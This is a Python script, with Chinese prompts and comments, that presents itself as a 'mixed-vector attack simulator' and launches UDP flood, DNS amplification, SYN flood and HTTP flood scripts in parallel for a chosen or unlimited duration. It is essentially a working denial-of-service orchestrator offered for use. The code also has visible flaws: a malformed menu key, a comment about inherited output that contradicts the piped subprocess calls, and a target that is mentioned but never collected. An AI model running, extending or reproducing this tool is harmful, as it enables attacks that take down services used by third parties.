import subprocess
import time
import os

# ==============================================================================
# 核心功能模块
# ==============================================================================

def get_user_input(prompt, default_value, value_type=str):
    """
    一个通用的函数，用于获取用户输入，并提供默认值和类型转换。
    """
    while True:
        user_input = input(f"{prompt} (默认为: {default_value}): ").strip()
        if not user_input:
            return default_value
        try:
            return value_type(user_input)
        except ValueError:
            print(f"输入无效，请输入一个有效的 {value_type.__name__} 类型的值。")

def select_attack_vectors(available_vectors):
    """
    提供一个多选菜单，让用户选择要组合的攻击向量。
    """
    print("\n请选择要组合的攻击向量 (可多选):")
    for key, name in available_vectors.items():
        print(f"  [{key}] {name}")
    
    while True:
        choices = input("请输入选项编号，以逗号分隔 (例如: 1,3): ").strip()
        selected_keys = [c.strip() for c in choices.split(',')]
        
        # 验证输入是否有效
        if all(key in available_vectors for key in selected_keys) and selected_keys:
            return selected_keys
        else:
            print("输入无效，请只选择列表中的编号。")

def run_subprocess(command):
    """
    在后台启动一个子进程来运行攻击脚本。
    """
    print(f"  -> 正在启动子进程: {' '.join(command)}")
    # 使用 Popen 在后台启动命令，不阻塞主进程
    return subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# ==============================================================================
# 主程序入口
# ==============================================================================

if __name__ == "__main__":
    print("--- 混合向量攻击模拟器 (指挥中心) ---")
    print("此工具可以同时调度多种攻击脚本，模拟真实的复合攻击场景。")
    print("-" * 50)

    # 定义所有可用的攻击向量及其对应的脚本和名称
    available_vectors = {
        '1': {"name": "UDP Flood (流量型)", "script": "/scripts/1_volume_based/udp_flood.py"},
        '2': {"name": "DNS Amplification (流量型)", "script": "/scripts/1_volume_based/dns_amplify.py"},
        '3': {"name": "SYN Flood (协议层)", "script": "/scripts/2_protocol_exhaustion/syn_flood.py"},
        '4.': {"name": "HTTP Flood (应用层)", "script": "/scripts/3_application_flood/http_flood.py"},
    }

    # 1. 用户选择要组合的攻击
    selected_keys = select_attack_vectors({k: v["name"] for k, v in available_vectors.items()})
    selected_scripts = [available_vectors[key]["script"] for key in selected_keys]

    print("\n--- 攻击参数配置 ---")
    # 2. 获取通用的攻击参数
    # 注意：这里我们假设所有攻击都针对同一个目标IP/URL，这是常见场景
    # 在真实攻击中，目标也可能不同，但为了简化模拟，我们使用统一目标
    duration = get_user_input("请输入总攻击持续时间 (秒, 0为无限)", 60, int)

    print("-" * 50)
    print("攻击计划确认:")
    print(f"  - 持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print("  - 将同时启动以下攻击:")
    for key in selected_keys:
        print(f"    - {available_vectors[key]['name']}")
    print("-" * 50)

    confirm = input("确认开始混合攻击? (y/n): ").lower()
    if confirm != 'y':
        print("攻击已取消。")
        exit()

    # 3. 启动所有选定的攻击子进程
    processes = []
    print("\n正在启动所有攻击向量...")
    for script_path in selected_scripts:
        # 为每个脚本创建一个子进程
        # 注意：子进程会继承父进程的 stdin, stdout, stderr
        # 这意味着子脚本的交互式提问会直接显示在当前终端
        proc = run_subprocess(["python", script_path])
        processes.append(proc)
        # 等待片刻，让用户有时间为每个脚本输入参数
        time.sleep(1) 

    # 4. 管理攻击时长并结束
    try:
        # 主进程在这里等待，直到时间结束或被手动中断
        if duration > 0:
            print(f"\n--- 所有向量已启动，混合攻击将持续 {duration} 秒... 按 Ctrl+C 可提前终止。 ---")
            time.sleep(duration)
        else:
            print("\n--- 所有向量已启动，混合攻击将无限期运行... 按 Ctrl+C 终止。 ---")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n检测到手动中断...")
    finally:
        print("正在停止所有攻击子进程...")
        for p in processes:
            # 终止所有子进程
            p.terminate()
        print("所有攻击向量已停止。指挥中心退出。")

